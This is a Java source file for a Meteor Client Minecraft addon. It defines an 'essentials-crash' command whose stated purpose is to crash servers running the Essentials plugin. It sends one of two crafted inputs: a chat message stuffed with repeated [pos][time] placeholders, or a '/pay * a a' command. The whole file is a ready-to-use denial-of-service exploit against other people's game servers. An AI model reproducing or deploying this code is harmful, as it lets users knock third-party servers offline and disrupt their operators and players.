package de.frxstdev.crashaddon.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.command.CommandSource;

public class EssentialsCrashCommand extends Command {
    public EssentialsCrashCommand() {
        super("essentials-crash", "Crash a Server that use Essentials Plugin", "ecrash", "essentials-exploit");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(literal("chat").executes(ctx -> {
            ChatUtils.sendPlayerMsg("[pos]<chat=2eb10939-d3a4-4355-a906-dd49649aacbf:[time]:>[pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time]");
            return SINGLE_SUCCESS;
        }));

        builder.then(literal("command").executes(ctx -> {
            ChatUtils.sendPlayerMsg("/pay * a a");
            return SINGLE_SUCCESS;
        }));

    }
}
